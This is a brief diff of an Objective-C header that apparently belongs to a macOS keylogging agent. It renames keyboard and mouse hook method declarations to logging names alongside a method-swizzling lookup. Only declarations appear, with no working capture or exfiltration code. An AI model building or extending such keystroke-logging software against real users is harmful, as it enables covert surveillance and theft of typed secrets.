@@ -21,8 +21,8 @@ extern int keylogAgentIsActive;
 //
 - (IMP)getImplementationOf: (SEL)lookup after: (IMP)skip;
 
-- (void)hookMouse: (NSEvent *)event;
-- (void)hookKeyboard: (NSEvent *)event;
+- (void)logMouse;
+- (void)logKeyboard: (NSEvent *)event;
 - (void)hookKeyboardAndMouse: (NSEvent *)event;
 
 //
